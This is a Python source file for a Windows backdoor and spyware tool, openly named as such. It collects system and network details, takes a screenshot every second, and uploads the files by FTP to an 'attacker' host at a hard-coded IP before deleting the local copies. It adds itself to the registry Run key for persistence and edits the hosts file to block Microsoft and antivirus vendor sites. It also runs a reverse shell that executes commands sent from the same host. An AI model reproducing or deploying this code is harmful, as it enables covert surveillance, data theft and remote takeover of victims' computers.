from __future__ import generators
from PyQt5.QtWidgets import QApplication
from tzlocal import get_localzone
from PyQt5.QtGui import QCursor
from zipfile import ZipFile
from requests import get
from ftplib import FTP
import subprocess
import netifaces
import pyautogui
import threading
import win32net
import platform
import datetime
import psutil
import shutil
import socket
import winreg
import math
import time
import sys
import os


# ============ Mouse Tracker ============ #
class Frame:
    def __init__(self, position, time):
        self.position = position
        self.time = time

    def speed(self, frame):
        d = distance(*self.position, *frame.position)
        time_delta = abs(frame.time - self.time)
        if time_delta == 0:
            return None
        else:
            return d / time_delta


def distance(x1, y1, x2, y2):
    return math.sqrt((x2 - x1) ** 2 + (y2 - y1) ** 2)


def get_current_cursor_position():
    pos = QCursor.pos()
    return pos.x(), pos.y()


def get_current_frame():
    return Frame(get_current_cursor_position(), time.time())
# ============ END Mouse Tracker ======== #

def check_files():
    while True:

        try:
            inf_file = f"c:\\Users\\{os.getlogin()}\\Videos\\{sysinfo.node}.txt"
            logfile = f"c:\\Users\\{os.getlogin()}\\Videos\\{sysinfo.node}-Logger.txt"
            img_file = f"c:\\Users\\{os.getlogin()}\\Videos\\{sysinfo.node}.png"

            return inf_file, logfile, img_file

        except (OSError, IOError):
            break
# noinspection PyBroadException,PyStatementEffect

def get_info(sysinf, info_file, last_rboot):
    def get_external_ip(info_file):
        while True:
            try:
                external_ip = get('https://api.ipify.org').text
                return external_ip

            except ConnectionError:
                with open(info_file, 'a+') as file:
                    file.seek(0)
                    file.write("Error getting External IP from https://api.ipify.org")
                break

    def get_mac(ip):
        for i in netifaces.interfaces():
            addrs = netifaces.ifaddresses(i)
            try:
                iface_mac = addrs[netifaces.AF_LINK][0]['addr']
                iface_ip = addrs[netifaces.AF_INET][0]['addr']

            except (IndexError, KeyError):
                iface_mac = iface_ip = None

            if iface_ip == ip:
                return iface_mac

            return None

    def show_mapped_drives():
        resume = 0
        while True:
            (_drives, total, resume) = win32net.NetUseEnum(None, 0, resume)
            for drive in _drives:
                if drive['local']:
                    return drive['local'], "=>", drive['remote']
            if not resume:
                break

    def get_windows_uuid():
        uuid_value = None
        try:
            registry = winreg.HKEY_LOCAL_MACHINE
            address = 'SOFTWARE\\Microsoft\\Cryptography'
            keyargs = winreg.KEY_READ | winreg.KEY_WOW64_64KEY
            key = winreg.OpenKey(registry, address, 0, keyargs)
            value = winreg.QueryValueEx(key, 'MachineGuid')
            winreg.CloseKey(key)
            uuid_value = value[0]
        except PermissionError:
            pass

        if not uuid_value:
            try:
                import subprocess
                output = subprocess.check_output(['vol', 'c:'])
                output = output.split()
                uuid_value = output[len(output) - 1:]

            except PermissionError:
                pass

        return uuid_value

    while True:
        try:
            with open(info_file, 'w') as file:
                # ================== System Info ==================
                file.write("=" * 10 + "System Info" + "=" * 10 + "\n")
                file.write(f"OS: {sysinf.system}\n")

                try:
                    os.environ["PROGRAMFILES(X86)"]
                    bits = 64
                    file.write(f"Version: {sysinf.version} | {str(bits)}bit\n")
                except:
                    bits = 32
                    file.write(f"Version: {sysinf.version} | {str(bits)}bit\n")

                file.write(f"Station Name: {sysinf.node}\n")
                file.write(f"Machine: {sysinf.machine}\n")
                file.write(f"Windows UUID: {get_windows_uuid()}")
                file.write(f"Processor: {sysinf.processor}\n")
                file.write(f"OS Local Timezone: {local_tz}\n")
                file.write(f"Boot Time: {datetime.datetime.fromtimestamp(last_rboot)}\n")

                # ================== Main Network Info ==================
                file.write("\n\n" + "=" * 10 + "Main Network Info" + "=" * 10 + "\n\n")
                file.write(f"Machine's External IP: {get_external_ip(info_file)}\n")
                file.write(f"Machine's LAN IP: {socket.gethostbyname(socket.gethostname())}\n")
                file.write(f"Machine's MAC Address: {get_mac(socket.gethostbyname(socket.gethostname()))}\n")
                file.write(f"Mapped Drives: {show_mapped_drives()}")
                net_users = subprocess.check_output(['net', 'users']).decode('utf-8')
                file.write(f"{net_users}")
                file.write(f"\n" + "=" * 10 + "ARP Results" + "=" * 10 + f"\n")
                arp_spoof = subprocess.check_output(['arp', '-a']).decode('utf-8')
                file.write(f"{arp_spoof}")
                file.write(f"\n" + "=" * 10 + "NetStat Results" + "=" * 10 + f"\n")
                try:
                    net_stat = subprocess.check_output(['netstat', '-a', '-n', '-b', '-o']) \
                        .decode('utf-8')
                    file.write(f"{net_stat}")
                except Exception as err:
                    file.write(f"Can't get results: {err}")

                file.close()
                break

        except OSError:
            break


def change_hosts():
    try:
        with open(f"c:\\Windows\\System32\\drivers\\etc\\hosts", 'a') as file:
            file.seek(2)
            file.write(f"\r"
                       f"0.0.0.0\twww.microsoft.com\n"
                       f"0.0.0.0\twww.kaspersky.com\n"
                       f"0.0.0.0\twww.mcafee.com\n"
                       f"0.0.0.0\twww.avast.com\n"
                       f"0.0.0.0\twww.nod32.com\n"
                       f"0.0.0.0\twww.eset.com/int/\n"
                       f"0.0.0.0\twww.bitdefender.com\n")
            file.close()
            print("File Changed")

    except PermissionError as e:
        print(f"Error: {e}")
        sys.exit()


def persistence(duration, key, value):
    time.sleep(duration)
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_SET_VALUE)

    try:
        if not os.path.exists(location):
            print("[+]Copying file...")
            shutil.copyfile(sys.executable, location)
            print("[+]Done!")

    except PermissionError as e:
        print(f"Permission Denied! {e}")

    with reg_key:
        if value is None:
            winreg.DeleteValue(reg_key, key)

        else:
            if '%' in value:
                var_type = winreg.REG_EXPAND_SZ

            else:
                var_type = winreg.REG_SZ

            winreg.SetValueEx(reg_key, key, 0, var_type, value)


def dozip(duration):
    print(f"Zipping in {duration} seconds...")
    zipper = ZipFile(f"c:\\Users\\{os.getlogin()}\\Videos\\{sysinfo.node}.zip", 'w')

    try:
        for z in range(30):
            zipper.write(f"c:\\Users\\{os.getlogin()}\\Videos\\{sysinfo.node}[{z + 1}].png")
            if f"{sysinfo.node}[{z}]" == f"{sysinfo.node}[30]":
                pass

    except FileNotFoundError:
        pass

    try:
        zipper.write(f"c:\\Users\\{os.getlogin()}\\Videos\\{sysinfo.node}-Logger.txt")

    except FileNotFoundError:
        pass

    try:
        zipper.write(f"c:\\Users\\{os.getlogin()}\\Videos\\{sysinfo.node}.txt")

    except FileNotFoundError:
        pass

    time.sleep(0.5)
    zipper.close()
    print("Zipped!")

    return zipper


def delete():
    print('Deleting local files...')
    for filename in os.listdir(dir_path):
        file_path = os.path.join(dir_path, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                print('Deleting local files...')
                shutil.rmtree(file_path)

        except OSError as err:
            print(f"Error deleting files: {err}")

    print("[!]Files Deleted!")


def upload(path):
    host = '192.168.136.131'
    user = 'attacker'
    password = 'Pass1234!'
    try:
        while True:
            with FTP(host) as ftp:
                ftp.login(user=user, passwd=password)
                print(f"{ftp.getwelcome()}")
                files = os.listdir(path)
                os.chdir(path)
                time.sleep(1.5)
                print("Uploading...")
                for f in files:
                    if os.path.isfile(path + f"\\{f}"):
                        fh = open(f, 'rb')
                        ftp.storbinary(f"STOR {f}", fh)
                        fh.close()
                    elif os.path.isdir(path + f"\\{f}"):
                        ftp.mkd(f)
                        ftp.cwd(f)
                        upload(path + f"\\{f}")
                ftp.cwd('..')
                os.chdir('..')
                print("Done!")
                break

    except Exception as err:
        print(err)


def upload_handler(duration, stop_event):

    while not stop_event.is_set():
        print("[+]Upload Thread started.")
        upload(dir_path)
        time.sleep(duration)
        if stop_event:
            print("[!]Upload Thread stopped.")


def get_screenshot(sc_file, stop_event):
    print(f"Start function {stop_event}")
    i = 0
    while not stop_event.is_set():
        print("[+]ScreenCapture started.")
        if not os.path.isfile(sc_file):
            pyautogui.screenshot(f"c:\\Users\\{os.getlogin()}\\Videos\\{sysinfo.node}[{i + 1}].png")
        i += 1
        time.sleep(1)
        if stop_event:
            print("[!]ScreenCapture stopped.")


def start_mouse(short, long):

    last_frame = get_current_frame()
    screenshot_thread = threading.Thread(target=get_screenshot,
                                         args=(check_files()[2], stop_event), name='Screenshot')
    upload_handler_thread = threading.Thread(target=upload_handler,
                                             args=(5, stop_event),
                                             name='Upload Handler')
    screenshot_thread.daemon = True
    upload_handler_thread.daemon = True

    screenshot_thread.start()
    upload_handler_thread.start()

    while True:
        new_frame = get_current_frame()
        current_position = get_current_cursor_position()
        last_frame = new_frame
        time.sleep(1)
        new_position = get_current_cursor_position()

        if current_position == new_position:
            time.sleep(1.5)
            print(f"Mouse Position: {get_current_cursor_position()} \n"
                  f"Mouse didn't move. Waiting for {short} sec...")
            time.sleep(short)
            new_position = get_current_cursor_position()

            if current_position == new_position:
                print(f"Mouse Position: {get_current_cursor_position()} \n"
                      f"Mouse didn't move. Waiting for {long} seconds...")
                time.sleep(long)
                new_position = get_current_cursor_position()

                if current_position == new_position:
                    print('Moving on...')
                    stop_event.set()
                    print(f"CRITICAL THREAD STOP EVENT: {stop_event.is_set()}")
                    get_screenshot(check_files()[2], stop_event)
                    upload_handler(3, stop_event)
                    zip_thread = threading.Thread(target=dozip, args=(3, ), name='Zip Thread')
                    zip_thread.start()
                    upload(dir_path)
                    delete()
                    stop_event.clear()

                    for t in range(48):
                        i = 1
                        print("Nesting phase: check every 30 minutes.")
                        print(f"Simulating minute: {i}")
                        time.sleep(1)

                        new_position = get_current_cursor_position()
                        if current_position != new_position:
                            stop_event.clear()
                            start_mouse(short=2, long=4)

                        else:
                            start_mouse(short=3, long=6)


def connection():
    while True:
        time.sleep(5)
        print("[i]Connecting to BackDoor...")

        try:
            soc.connect((server_host, server_port))
            message = soc.recv(buffer_size).decode()
            print(f"{message}")
        except Exception:
            connection()

        backdoor()


def backdoor():
    while True:
        command = soc.recv(buffer_size).decode()
        try:
            if str(command.lower()) == "exit":
                print('[!]Connection closed by attacker.')
                break

        except (ConnectionError, KeyboardInterrupt) as err:
            print(f"Error: {err} \n[!]Connection closed.")
            exit()

        output = subprocess.getoutput(command)
        soc.send(f"{output}\n".encode())

    soc.shutdown(1)
    soc.close()


def main(sysinfo, last_reboot):
    threads.append(persistence_thread)
    threads.append(get_info_thread)
    threads.append(change_hosts_thread)

    for s in threads:
        s.start()


if __name__ == "__main__":
    stop_event = threading.Event()
    app = QApplication(sys.argv)
    threads = []
    keys = []
    count = 0
    sysinfo = platform.uname()
    dir_path = f"c:\\users\\{os.getlogin()}\\Videos\\"
    script_file = os.path.dirname(os.path.realpath(__file__))
    zipped = f"c:\\Users\\{os.getlogin()}\\Videos\\{sysinfo.node}.zip"
    local_tz = get_localzone()
    last_reboot = psutil.boot_time()
    location = os.environ["appdata"] + "\\backdoor.exe"
    server_host = '192.168.136.131'
    server_port = 5000
    buffer_size = 1024

    soc = socket.socket()
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    get_info_thread = threading.Thread(target=get_info,
                                       args=(sysinfo, check_files()[0], last_reboot), name='Get Info')
    start_mouse_thread = threading.Thread(target=start_mouse,
                                          args=(3, 6), name='Mouse Tracker')

    change_hosts_thread = threading.Thread(target=change_hosts, name='Change Hosts File')
    persistence_thread = threading.Thread(target=persistence, args=(3, 'Backdoor', location), name='Copy Script')
    connection_thread = threading.Thread(target=connection, name='Backdoor')

    connection_thread.daemon = True
    start_mouse_thread.daemon = True

    connection_thread.start()
    start_mouse_thread.start()

    main(sysinfo, last_reboot)

    while True:
        if not start_mouse_thread.is_alive():
            start_mouse_thread.start()
